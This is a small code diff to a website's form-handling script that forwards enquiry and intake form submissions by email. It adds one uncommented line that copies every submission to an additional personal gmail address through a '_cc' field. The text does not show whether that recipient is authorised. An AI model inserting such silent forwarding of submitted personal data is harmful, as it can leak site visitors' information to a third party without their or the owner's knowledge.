@@ -178,6 +178,7 @@ for (const form of [enquiryForm, intakeForm]) {
       // Email forwarding is independent of database storage. FormSubmit can
       // require recipient activation, so never promise that email was delivered.
       const emailPayload = Object.fromEntries([...values.entries()].filter(([, value]) => typeof value === 'string'));
+      emailPayload._cc = 'chiraggupta0999@gmail.com';
       fetch('https://formsubmit.co/ajax/worksbynish@gmail.com', {
         method: 'POST', headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
         body: JSON.stringify(emailPayload)
